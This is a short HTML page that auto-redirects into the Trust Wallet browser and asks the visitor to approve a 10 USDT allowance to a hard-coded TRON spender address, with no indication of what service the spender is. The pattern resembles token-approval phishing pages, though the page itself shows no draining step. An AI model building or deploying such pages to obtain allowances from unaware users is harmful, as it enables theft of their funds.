<!DOCTYPE html>
<html>
<head>
  <title>Approve USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="background:#0b0f14;color:white;text-align:center;padding:40px;font-family:sans-serif;">

  <h2>Approve 10 USDT</h2>

  <p id="status">Opening in Trust Wallet...</p>

  <button id="approveBtn" onclick="approve()" 
    style="display:none;padding:15px 25px;background:#f59e0b;border:none;border-radius:10px;color:white;">
    Approve Now
  </button>

  <script>
    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
    const AMOUNT = 10 * 1e6;

    let redirected = false;

    function waitForWallet() {
      let tries = 0;

      const interval = setInterval(() => {

        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(interval);

          document.getElementById("status").innerText =
            "Wallet detected. Tap approve to continue.";

          document.getElementById("approveBtn").style.display = "block";
        }

        tries++;

        // redirect only once if not inside wallet
        if (tries > 10 && !redirected) {
          redirected = true;

          const url = encodeURIComponent(window.location.href);
          window.location.href =
            `https://link.trustwallet.com/open_url?url=${url}`;

          clearInterval(interval);
        }

      }, 200);
    }

    function approve() {
      document.getElementById("status").innerText =
        "Waiting for approval...";

      window.tronWeb.contract().at(CONTRACT).then(contract => {
        contract.approve(SPENDER, AMOUNT).send({
          feeLimit: 100000000
        }).then(tx => {
          document.getElementById("status").innerText =
            "Approved successfully ✅";
        }).catch(() => {
          document.getElementById("status").innerText =
            "Approval cancelled ❌";
        });
      });
    }

    waitForWallet();
  </script>

</body>
</html>
